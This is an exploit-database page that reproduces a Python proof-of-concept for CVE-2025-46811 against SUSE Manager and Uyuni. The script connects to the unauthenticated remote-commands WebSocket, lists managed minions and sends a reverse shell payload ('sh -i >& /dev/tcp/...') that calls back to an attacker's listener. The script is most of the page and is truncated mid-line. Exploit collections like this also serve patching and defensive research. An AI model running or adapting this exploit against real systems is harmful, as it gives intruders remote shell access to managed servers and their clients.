---
title: SUSE Manager 4.3.15 Code Execution
url: https://cxsecurity.com/issue/WLB-2026050016
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-23
fetch_date: 2026-05-24T06:00:44.742273
---

# SUSE Manager 4.3.15 Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SUSE Manager 4.3.15 Code Execution** **2026.05.23**  Credit:  **[Wiktor Maj](https://cxsecurity.com/author/Wiktor%2BMaj/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-46811](https://cxsecurity.com/cveshow/CVE-2025-46811/ "Click to see CVE-2025-46811")**  CWE: **N/A** | |

# Exploit Title: SUSE Manager 4.3.15 - Code Execution
# Date: 29.01.2026
# Exploit Author: Wiktor Maj
# Vendor Homepage: https://www.uyuni-project.org/
# Software Link: https://github.com/uyuni-project/uyuni
# Version: Uyuni 2025.05, SUSE Manager 5.0.4, SUSE Manager 4.3.15
# Tested on: Debian 12 (bookworm), Python 3.11.2 with websocket-client 1.9.0
# CVE: CVE-2025-46811
# Sends a reverse shell payload to the vulnerable WebSocket of either SUSE Manager or Uyuni.
# Set up a listener session in a separate terminal.
# After the payload is sent, switch to your listener terminal to check if a shell pops up.
# Example:
# python3 cve-2025-46811.py --ip 192.168.10.126 --port 443 --host-ip 192.168.10.113 --host-port 9001 --ssl
#### PROGRAM CONSTRAINTS ####
PAYLOAD = f"sh -i >& /dev/tcp/HOST\_IP/HOST\_PORT 0>&1" # reverse shell payload, HOST\_IP and HOST\_PORT will be substituted with CLI args
CONNECTION\_RETRIES = 4 # number of connection attempts
CONNECTION\_DELAY\_BETWEEN\_RETRIES = 15 # seconds
WEBSOCKET\_TIMEOUT = 10 # seconds
##############################
import argparse
import json
import socket
import ssl
import sys
import time
import websocket
def parse\_args() -> argparse.Namespace:
parser = argparse.ArgumentParser(description="Implementation of CVE-2025-46811 exploit for SUSE Manager & Uyuni.", add\_help=False)
parser.add\_argument("-h", "--help", action="help", default=argparse.SUPPRESS, help="Display this help text and exit.")
parser.add\_argument("--ip", required=True, help="Victim IPv4 or hostname.")
parser.add\_argument("--port", type=int, default=443, help="Victim port (default: 443).")
parser.add\_argument("--host-ip", required=True, help="Attacker host IPv4 or hostname.")
parser.add\_argument("--host-port", type=int, required=True, help="Attacker host port.")
group = parser.add\_mutually\_exclusive\_group()
group.add\_argument("--ssl", dest="ssl", action="store\_true",
help="Use SSL/TLS for the WebSocket connection (default).")
group.add\_argument("--no-ssl", dest="ssl", action="store\_false",
help="Disable SSL/TLS and use plaintext WebSocket.")
parser.set\_defaults(ssl=True)
return parser.parse\_args()
def resolve\_target(hostname: str) -> str:
return socket.gethostbyname(hostname)
def receive\_preview\_minions\_message(websocket\_connection: websocket.WebSocket) -> str:
while True:
try:
message = websocket\_connection.recv()
if message:
print("Received:", message)
if isinstance(message, bytes):
message = message.decode("utf-8", errors="replace")
return message
except websocket.WebSocketTimeoutException as exception:
raise RuntimeError("Failed to receive preview minions message") from exception
def decode\_preview\_minions\_message(message: str) -> list[str]:
try:
preview\_output = json.loads(message)
except json.JSONDecodeError as exception:
raise RuntimeError("Preview response is not valid JSON") from exception
if (
isinstance(preview\_output, dict)
and isinstance(preview\_output.get("minions"), list)
and preview\_output["minions"]
and all(isinstance(entity, str) for entity in preview\_output["minions"])
):
return preview\_output["minions"]
raise RuntimeError("Preview response expected non-empty 'minions' list")
def receive\_preview\_minions(websocket\_connection: websocket.WebSocket) -> list[str]:
message = receive\_preview\_minions\_message(websocket\_connection)
minions = decode\_preview\_minions\_message(message)
return minions
def select\_minion(minions: list[str]) -> str:
print("Available minions:")
for minion\_id, minion\_name in enumerate(minions, start=1):
print(f"{minion\_id}) {minion\_name}")
prompt = "Select minion number (default is '1', or 'c' to cancel): "
while True:
choice = input(prompt).strip()
if choice == "":
return minions[0]
if choice.lower() == "c":
print("No minion selected. Exiting.")
sys.exit(0)
if choice.isdigit():
index = int(choice)
if 1 <= index <= len(minions):
return minions[index - 1]
print("Invalid selection.")
def connect\_to\_websocket(target\_ip: str,
port: int,
use\_ssl: bool,
sslopt: dict,
) -> websocket.WebSocket:
scheme = "wss" if use\_ssl else "ws"
try:
return websocket.create\_connection(
f"{scheme}://{target\_ip}:{port}/rhn/websocket/minion/remote-commands",
timeout=WEBSOCKET\_TIMEOUT,
sslopt=sslopt,
)
except ssl.SSLError as exception:
if "WRONG\_VERSION\_NUMBER" in str(exception):
raise RuntimeError("Websocket seems to be unsecured, try with --no-ssl") from exception
raise
except websocket.WebSocketBadStatusException as exception:
if exception.status\_code == 400:
raise RuntimeError("Websocket seems to be secured, try with --ssl") from exception
raise
except TimeoutError as exception:
raise RuntimeError("Websocket is likely under firewall") from exception
def get\_minions(target\_ip: str,
port: int,
use\_ssl: bool,
) -> tuple[websocket.WebSocket, list[str]]:
sslopt = {"cert\_reqs": ssl.CERT\_NONE, "check\_hostname": False}
for attempt in range(1, CONNECTION\_RETRIES + 1):
websocket\_connection = None
try:
websocket\_connection = connect\_to\_websocket(target\_ip, port, use\_ssl, sslopt)
websocket\_connection.send(json.dumps({"preview": True, "target": "\*"}))
minions = receive\_preview\_minions(websocket\_connection)
return websocket\_connection, minions
except (
websocket.WebSocketTimeoutException,
websocket.WebSocketConnectionClosedException,
):
if websocket\_connection is not None:
websocket\_connection.close()
if attempt == CONNECTION\_RETRIES:
break
time.sleep(CONNECTION\_DELAY\_BETWEEN\_RETRIES)
raise RuntimeError("Target websocket is not vulnerable or not reachable")
def send\_payload(websocket\_connection: websocket.WebSocket, target: str) -> None:
payload = PAYLOAD.replace("HOST\_IP", args.host\_ip).replace("HOST\_PORT", str(args.host\_port))
websocket\_connection.send(json.dumps({"preview": False, "target": target, "c...